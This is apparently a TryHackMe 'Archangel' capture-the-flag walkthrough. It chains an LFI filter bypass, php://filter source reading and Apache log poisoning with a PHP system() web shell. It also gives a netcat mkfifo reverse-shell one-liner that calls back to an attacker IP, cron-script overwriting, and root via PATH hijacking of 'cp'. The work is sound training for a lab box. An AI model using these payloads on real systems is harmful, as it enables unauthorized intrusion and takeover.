# Archangel Room - TryHackMe


### Initial Port-scan
![alt-text](https://github.com/pg-cy/CTF-Walkthrough/blob/main/Archangel/images/nmap.png)

- There is a webserver on port 80, so ill directory bruteforce to see if i can find anything interesting.

![alt-text](https://github.com/pg-cy/CTF-Walkthrough/blob/main/Archangel/images/dir_busting.png)

- Looking at the Directory scan, theres a /flags folder. I knew this was too easy, when i clicked on the link inside the file, it links to a youtube video "rick-rolled". I searched through a bunch of other directories but nothing stood out.
--------------
- At the top of the page of the main site, we we can see another hostname, which is one of the questions THM was asking for. 
![alt-text](https://github.com/pg-cy/CTF-Walkthrough/blob/main/Archangel/images/hostname.png)

- Now to be able to reach that site, we need to specify the address in our /etc/hosts file. Youll need sudo to edit it.
![alt-text](https://github.com/pg-cy/CTF-Walkthrough/blob/main/Archangel/images/hosts.png)

- After that we can just put in the host-name in the url and it will take us to that site, because the hostname can be resolved to a IP now
- We found the first flag right at the front page of the new site.
![alt-text](https://github.com/pg-cy/CTF-Walkthrough/blob/main/Archangel/images/flag1.png)

----------
- Ok since this is a completely new site lets start directory bruteforcing again with fereoxbuster.
![alt-text](https://github.com/pg-cy/CTF-Walkthrough/blob/main/Archangel/images/dir_newsite.png)

- So we found 2 folders: /Robots.txt and /test.php. Ill start with robots first.
- Inside the robots folder, its the other file we found thats disallowed. So lets take a look at /test.php

![alt-text](https://github.com/pg-cy/CTF-Walkthrough/blob/main/Archangel/images/testbutton.png)
- As soon as i press the button on the  /test.php page. It sends a get request querying a file: mrrobot.php
![alt-text](https://github.com/pg-cy/CTF-Walkthrough/blob/main/Archangel/images/test-file.png)

- At this point im trying for LFI vulnerabilities. I tried to transverse directories using ../../../../etc/passwd but there was some sort of filter. So i quickly googled LFI bypasses and came across this github page of some great bypasses. 
- https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/File%20Inclusion

### Testing for LFI
- I Tried many bypasses until i found the double slashes worked.  ..//..//..//..//..//..//..//..//etc//passwd
![alt-text](https://github.com/pg-cy/CTF-Walkthrough/blob/main/Archangel/images/passwd.png)
- If we look at the source file using our LFI, we can find the second flag.
- I ran into some issues trying to display the contents with the double slashes ..// so i had to base64 encode it using this paylaod. Once you have the base64 string you can decode it wherever youd like.
- `http://mafialive.thm/test.php?view=php://filter/convert.base64-encode/resource=/var/www/html/development_testing/test.php`
--------------
- Now lets try to LFI the apache logs. 	/..//..//..//..//..//..//..//..//var//log//apache2//access.log
- Looks like we can, and we can see from the image its storing our user-agent "Mozilla...". This will be our attack vector
![alt-text](https://github.com/pg-cy/CTF-Walkthrough/blob/main/Archangel/images/logs.png)
--------------
### RCE
- The user-agent is where we are going to put our payload
- `<?php system($_GET['cmd']); ?>` put this payload inside our user-agent, you can use curl, burpsuite, or whatever you prefer. Im using burpsuite for this example.
- to access the RCE you add `&cmd=` at the end of the URL. In this example im testing rce with `id`, but im also adding in a echo command with any string so i can easily find my results with a quick search directly on the page.
![alt-text](https://github.com/pg-cy/CTF-Walkthrough/blob/main/Archangel/images/rce_path.png)
![alt-text](https://github.com/pg-cy/CTF-Walkthrough/blob/main/Archangel/images/rce.png)

- looks like everything works. Now for the reverse_shell.
- this will be our payload for our RCE to execute. (Make sure to start a netcat listener on your own IP and PORT that you specified in the payload. Mine will be on port 443)
- `rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc $YOUR_IP 443 >/tmp/f` 
- Important to note, you might run into the issue where the URL doesnt get processed properly and it might take you to google. You need to URL encode the payload, and specify the port the domain is on.
- `http://mafialive.thm:80/test.php?view=/var/www/html/development_testing/..//..//..//..//..//var//log//apache2//access.log&cmd=m%20%2Ftmp%2Ff%3Bmkfifo%20%2Ftmp%2Ff%3Bcat%20%2Ftmp%2Ff%7C%2Fbin%2Fsh%20-i%202%3E%261%7Cnc%2010.9.100.95%209999%20%3E%2Ftmp%2Ff`

---------
- Now we have a shell. 
- To stabalize use `python3  -c   'import pty; pty.spawn("/bin/bash")'`


- While using linpeas to find ways to esculate privileges, theres an interesting script found in /opt.
![alt-text](https://github.com/pg-cy/CTF-Walkthrough/blob/main/Archangel/images/hello_world.png)
- Doing a bit more enumeration, we also find the script is being run every minute by cron with the user archangle.
![alt-text](https://github.com/pg-cy/CTF-Walkthrough/blob/main/Archangel/images/cron.png)

- We have write permissions on the file too, so lets put in a reverse_shell just like we previously did. Also dont forget to start another nc listerner on a different port 
- echo "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc $YOUR_IP 6666 >/tmp/f" > helloworld.sh
![alt-text](https://github.com/pg-cy/CTF-Walkthrough/blob/main/Archangel/images/arc.png)


- WoooO!, now we have upgraded to the user archangel. Time for more enumeration.
- looking inside archangel's home directory, inside /secret theres the second flag. Also there is a binary file "backup", owned by root that we have read and execute permissions on. 
- cat'ing the binary we see its running a cp command
![alt-text](https://github.com/pg-cy/CTF-Walkthrough/blob/main/Archangel/images/binary.png)


- So lets create a malicous file named "cp" and put it into our /tmp directory
- `touch /tmp/cp`
- cd into the /tmp directory and `echo "/bin/bash" > cp`
- Now all we need to do is modify our $PATH, then execute the backup file.
- `export PATH=/tmp:$PATH`
- now cd back to the directory with our backup file and run it ./backup
![alt-text](https://github.com/pg-cy/CTF-Walkthrough/blob/main/Archangel/images/root.png)
- WOooOO! 
- GO into the root directory to find the last flag



